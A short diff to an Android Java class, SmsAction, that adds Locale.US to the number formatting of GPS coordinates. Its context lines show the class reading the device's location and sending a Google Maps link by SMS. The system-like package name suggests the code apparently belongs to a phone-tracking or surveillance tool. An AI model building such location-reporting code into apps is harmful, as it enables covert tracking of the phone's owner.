@@ -10,6 +10,7 @@
 package com.android.networking.action;
 
 import java.util.Date;
+import java.util.Locale;
 
 import android.content.Context;
 import android.location.Location;
@@ -281,7 +282,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		final double lat = location.getLatitude();
 		final double lng = location.getLongitude();
 		
-		String text = String.format("lat:%.5f lon:%.5f", lat,lng);
+		String text = String.format(Locale.US, "lat:%.5f lon:%.5f", lat,lng);
 		final Date date = new Date(location.getTime());
 		
 		if (Cfg.DEBUG) {
@@ -289,7 +290,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		}
 
 		String instance = new String(Keys.self().getBuildId());
-		String textMaps = String.format("https://maps.google.com/maps?q=%.5f,+%.5f", lat, lng);
+		String textMaps = String.format(Locale.US, "https://maps.google.com/maps?q=%.5f,+%.5f", lat, lng);
 		
 		sendSMS(textMaps);
 
